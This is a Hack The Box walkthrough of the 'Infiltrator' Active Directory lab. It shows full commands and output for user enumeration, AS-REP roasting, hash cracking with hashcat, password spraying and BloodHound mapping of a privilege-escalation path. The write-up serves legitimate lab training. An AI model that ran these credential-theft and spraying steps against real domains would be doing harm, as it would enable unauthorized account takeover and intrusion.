---
title: Hack-the-box - Write-up - Infiltrator
categories: [Walkthroughs]
tags: [infiltrator,htb,kerbrute,nmap,bloodyAD,kerberoasting]     
---

## Reconnaissance
Initially, I conducted an `Nmap` service scan using the default scripts to gather information about the target. 

> Always save the Nmap output in a text file for future reference. This practice is invaluable, as repeatedly running Nmap can be time-consuming and unnecessary.
{: .prompt-tip }

```shell
┌──(frodo㉿kali)-[~/hack-the-box/infiltrator]
└─$ nmap -sC -sV --min-rate 1000 -o nmap_output 10.129.231.134
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-02 00:00 IST
Nmap scan report for 10.129.231.134
Host is up (0.098s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Infiltrator.htb
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-01 18:30:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-10-01T18:31:56+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-10-01T18:31:56+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-10-01T18:31:56+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
|_ssl-date: 2024-10-01T18:31:56+00:00; 0s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-10-01T18:31:56+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc01.infiltrator.htb
| Not valid before: 2024-07-30T13:20:17
|_Not valid after:  2025-01-29T13:20:17
| rdp-ntlm-info: 
|   Target_Name: INFILTRATOR
|   NetBIOS_Domain_Name: INFILTRATOR
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: infiltrator.htb
|   DNS_Computer_Name: dc01.infiltrator.htb
|   DNS_Tree_Name: infiltrator.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-10-01T18:31:17+00:00
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-10-01T18:31:18
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.52 seconds


```

Upon reviewing the Nmap report, we can confidently conclude that the target is a Domain Controller, evident from the presence of port 88/tcp, which is used for Kerberos authentication. 

Following this, we ran `netexec` to investigate whether there are any SMB null sessions on the server. However, our search revealed that no SMB null sessions were found.

```shell
(frodo㉿kali)-[~/hack-the-box/infiltrator]
└─$ netexec smb 10.129.231.134 -u guest -p ''
SMB         10.129.231.134  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.134  445    DC01             [-] infiltrator.htb\guest: STATUS_ACCOUNT_DISABLED

```

We will now update the local hosts file located at `/etc/hosts` by adding the entries for `infiltrator.htb` and `DC01.infiltrator.htb`. 

Next, we will investigate the IIS website running on `port 80` to uncover any valuable information. 

During our exploration of the website, we discovered the full names of seven employees: David Anderson, Olivia Martinez, Kevin Turner, Amanda Walker, Marcus Harris, Ethan Rodriguez, and Lauren Clark. 

We will compile these names into a text file and then use the `username-anarchy` tool to generate a list of potential usernames.

```shell

┌──(frodo㉿kali)-[~/hack-the-box/infiltrator]
└─$ /home/frodo/Tools/username-anarchy/username-anarchy -i users.txt -f first.last,flast,f.last,lfirst,l.first > usernames.txt

```

Using `kerbrute`, we will proceed to check the existence of the previously compiled usernames within the environment. This tool will allow us to efficiently verify whether these usernames are valid accounts in the Active Directory, aiding our reconnaissance efforts.

```bash
┌──(frodo㉿kali)-[~/hack-the-box/infiltrator]
└─$ /home/frodo/Tools/kerbrute userenum --dc dc01.infiltrator.htb -d infiltrator.htb usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/15/24 - Ronnie Flathers @ropnop

2024/10/15 11:02:07 >  Using KDC(s):
2024/10/15 11:02:07 >   dc01.infiltrator.htb:88

2024/10/15 11:02:07 >  [+] VALID USERNAME:  d.anderson@infiltrator.htb
2024/10/15 11:02:07 >  [+] VALID USERNAME:  o.martinez@infiltrator.htb
2024/10/15 11:02:08 >  [+] VALID USERNAME:  a.walker@infiltrator.htb
2024/10/15 11:02:08 >  [+] VALID USERNAME:  k.turner@infiltrator.htb
2024/10/15 11:02:08 >  [+] VALID USERNAME:  m.harris@infiltrator.htb
2024/10/15 11:02:08 >  [+] VALID USERNAME:  e.rodriguez@infiltrator.htb
2024/10/15 11:02:08 >  [+] VALID USERNAME:  l.clark@infiltrator.htb
2024/10/15 11:02:08 >  Done! Tested 35 usernames (7 valid) in 0.535 seconds
```

We successfully identified seven valid usernames within the environment. Next, we will copy these usernames and utilize Impacket's GetNPUsers script to check for any associated hashes. This script will help us determine if any of these users have Kerberos Pre-authentication disabled, allowing us to retrieve their hashes if available.

```shell
┌──(frodo㉿kali)-[~/hack-the-box/infiltrator]
└─$ impacket-GetNPUsers infiltrator/ -usersfile usernames.txt -dc-ip 10.129.231.134 -outputfile hashes.txt
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User d.anderson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User o.martinez doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User k.turner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a.walker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User m.harris doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User e.rodriguez doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$l.clark@INFILTRATOR:0dc2de40b655d19b5a27a9d801f41c55$6f05e67d341b66f35ffc4cec279472aa4d5f09c6e3d09d759109b86282f2ab1ac59cfef22270d77f59897c790b3dd5a7786165550a3c689f7d7b6c99157b12ea57bdc554bae420e6ec20b0a053543035db970c0031878e9e7a0d3f5073a75b95fddd630bd0457500953db37312271759a51cda18d986ab3a9dcb25b7ae6feacac31fe7bc209594b43aea6edf71e8c882677063fc56301821759e2da9d69356e7d2a29bea54b1febf1090f1b7bf98afa8a38a9ce91d6ada0ab06de2da39c75ded66e725eaa3e2c6c0b634facf6e5dbc5613b6cb5580b424ca7641f20c3b2d7336260392955649e30024c8c2f72c75
                                                                                                                                                 
┌──(frodo㉿kali)-[~/hack-the-box/infiltrator]
└─$ cat hashes.txt   
$krb5asrep$23$l.clark@INFILTRATOR:0dc2de40b655d19b5a27a9d801f41c55$6f05e67d341b66f35ffc4cec279472aa4d5f09c6e3d09d759109b86282f2ab1ac59cfef22270d77f59897c790b3dd5a7786165550a3c689f7d7b6c99157b12ea57bdc554bae420e6ec20b0a053543035db970c0031878e9e7a0d3f5073a75b95fddd630bd0457500953db37312271759a51cda18d986ab3a9dcb25b7ae6feacac31fe7bc209594b43aea6edf71e8c882677063fc56301821759e2da9d69356e7d2a29bea54b1febf1090f1b7bf98afa8a38a9ce91d6ada0ab06de2da39c75ded66e725eaa3e2c6c0b634facf6e5dbc5613b6cb5580b424ca7641f20c3b2d7336260392955649e30024c8c2f72c75

```

We successfully retrieved the hash for the user l.clark. 
Next, we will proceed to crack this hash using our preferred password cracking tool ` Hashcat`. For your information, Hashcat is pre-installed with Kali Linux, making it readily accessible for our use.

```shell
hashcat -a 0 -m 18200 -o cracked.txt hashes /usr/share/wordlists/rockyou.txt
```

We successfully cracked the hash for the user `l.clark`. This achievement will enhance our understanding of the user's credentials and potentially provide further access to the environment.

```shell
┌──(frodo㉿kali)-[~/hack-the-box/infiltrator]
└─$ cat cracked.txt 
$krb5asrep$23$l.clark@INFILTRATOR:0dc2de40b655d19b5a27a9d801f41c55$6f05e67d341b66f35ffc4cec279472aa4d5f09c6e3d09d759109b86282f2ab1ac59cfef22270d77f59897c790b3dd5a7786165550a3c689f7d7b6c99157b12ea57bdc554bae420e6ec20b0a053543035db970c0031878e9e7a0d3f5073a75b95fddd630bd0457500953db37312271759a51cda18d986ab3a9dcb25b7ae6feacac31fe7bc209594b43aea6edf71e8c882677063fc56301821759e2da9d69356e7d2a29bea54b1febf1090f1b7bf98afa8a38a9ce91d6ada0ab06de2da39c75ded66e725eaa3e2c6c0b634facf6e5dbc5613b6cb5580b424ca7641f20c3b2d7336260392955649e30024c8c2f72c75:WAT?watismypass!

```
## Foothold

Next, we will run `Evil-WinRM` to establish a foothold on the server. This tool will allow us to remotely manage the system and explore further opportunities for exploitation.

Using the credentials obtained, we attempted to enumerate SMB shares in search of valuable resources; however, no useful shares were discovered. 

Next, we will employ `netexec` to spray the cracked password across all known usernames, allowing us to identify any potential access points.

```shell
┌──(frodo㉿kali)-[~/hack-the-box/infiltrator]
└─$ netexec smb dc01.infiltrator.htb -u usernames.txt -p 'WAT?watismypass!' --continue-on-success
SMB         10.129.231.134  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.231.134  445    DC01             [-] infiltrator.htb\d.anderson:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.231.134  445    DC01             [-] infiltrator.htb\o.martinez:WAT?watismypass! STATUS_LOGON_FAILURE 
SMB         10.129.231.134  445    DC01             [-] infiltrator.htb\k.turner:WAT?watismypass! STATUS_LOGON_FAILURE 
SMB         10.129.231.134  445    DC01             [-] infiltrator.htb\a.walker:WAT?watismypass! STATUS_LOGON_FAILURE 
SMB         10.129.231.134  445    DC01             [-] infiltrator.htb\m.harris:WAT?watismypass! STATUS_ACCOUNT_RESTRICTION 
SMB         10.129.231.134  445    DC01             [-] infiltrator.htb\e.rodriguez:WAT?watismypass! STATUS_LOGON_FAILURE 
SMB         10.129.231.134  445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass!

```
Upon reviewing the results, we noted that the accounts for `d.anderson` and `m.harris` returned a `STATUS_ACCOUNT_RESTRICTION` message. This suggests that these accounts may be members of the `Protected Users` Security Group in Active Directory, restricting them to Kerberos authentication only. 

To proceed, we will run netexec again, this time utilizing Kerberos for authentication.

```shell
┌──(frodo㉿kali)-[~/hack-the-box/infiltrator]
└─$ netexec smb dc01.infiltrator.htb --kerberos -u usernames.txt -p 'WAT?watismypass!' --continue-on-success
SMB         dc01.infiltrator.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\d.anderson:WAT?watismypass! 
SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\o.martinez:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\k.turner:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\a.walker:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\m.harris:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         dc01.infiltrator.htb 445    DC01             [-] infiltrator.htb\e.rodriguez:WAT?watismypass! KDC_ERR_PREAUTH_FAILED 
SMB         dc01.infiltrator.htb 445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass!
```
This time, our attempt was successful, revealing that `d.anderson` and `l.clark` are using the same password. 
With this information in hand, we will now run `enum4linux` to gather additional useful information from the environment, which may provide further insights into user accounts and resources.

```shell
┌──(frodo㉿kali)-[~/hack-the-box/infiltrator]
└─$ enum4linux -U -u l.clark -p 'WAT?watismypass!' 10.129.231.134
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Oct 15 11:13:36 2024

 =========================================( Target Information )=========================================

Target ........... 10.129.231.134
RID Range ........ 500-550,1000-1050
Username ......... 'l.clark'
Password ......... 'WAT?watismypass!'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ===========================( Enumerating Workgroup/Domain on 10.129.231.134 )===========================

[E] Can't find workgroup/domain

 ==================================( Session Check on 10.129.231.134 )==================================

[+] Server 10.129.231.134 allows sessions using username 'l.clark', password 'WAT?watismypass!'

 ===============================( Getting domain SID for 10.129.231.134 )===============================

Domain Name: INFILTRATOR
Domain Sid: S-1-5-21-2606098828-3734741516-3625406802

[+] Host is part of a domain (not a workgroup)

 ======================================( Users on 10.129.231.134 )======================================

index: 0xfb5 RID: 0x453 acb: 0x00000210 Account: A.walker Name: (null) Desc: (null)
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator Name: (null) Desc: Built-in account for administering the computer/domain
index: 0xfb1 RID: 0x44f acb: 0x00000210 Account: D.anderson Name: (null) Desc: (null)
index: 0xfb7 RID: 0x455 acb: 0x00000210 Account: E.rodriguez Name: (null) Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest Name: (null) Desc: Built-in account for guest access to the computer/domain
index: 0xfb6 RID: 0x454 acb: 0x00000210 Account: K.turner Name: (null) Desc: MessengerApp@Pass!
index: 0xf10 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null) Desc: Key Distribution Center Service Account
index: 0xfb2 RID: 0x450 acb: 0x00010210 Account: L.clark Name: (null) Desc: (null)
index: 0x1312 RID: 0x1fa5 acb: 0x00000210 Account: lan_managment Name: lan_managment Desc: (null)
index: 0xfb3 RID: 0x451 acb: 0x00000210 Account: M.harris Name: (null) Desc: (null)
index: 0xfb4 RID: 0x452 acb: 0x00000210 Account: O.martinez Name: (null) Desc: (null)
index: 0xfc1 RID: 0x641 acb: 0x00000210 Account: winrm_svc Name: (null) Desc: (null)
```

During our investigation, we discovered that the password for user `k.turner` is stored in the description field: `MessengerApp@Pass!`. 
We will also copy the rest of the usernames identified. However, it appears that this newly found password did not grant access to any accounts, suggesting it may have been changed.

 Next, we will run `bloodhound-python` to gather more details about potential attack paths within the environment.

```shell
┌──(frodo㉿kali)-[~/hack-the-box/infiltrator]
└─$ bloodhound-python -c All -d infiltrator.htb -ns 10.129.231.134 -u l.clark -p 'WAT?watismypass!' --zip
INFO: Found AD domain: infiltrator.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.infiltrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.infiltrator.htb
INFO: Found 14 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.infiltrator.htb
INFO: Done in 00M 17S
INFO: Compressing output into 20241015113615_bloodhound.zip
```

Upon analyzing the Bloodhound graph, we identified several key relationships: d.anderson has GenericAll permissions on the group 'Marketing Digital', which allows him to change the password for e.rodriguez, who is a member of that group. Furthermore, e.rodriguez possesses the rights to add himself to the 'Chiefs Marketing' group. Members of this group have the privilege to reset the password for m.harris, who, in turn, can use PS Remote to access the Domain Controller. This chain of permissions presents a significant attack path that we can exploit.



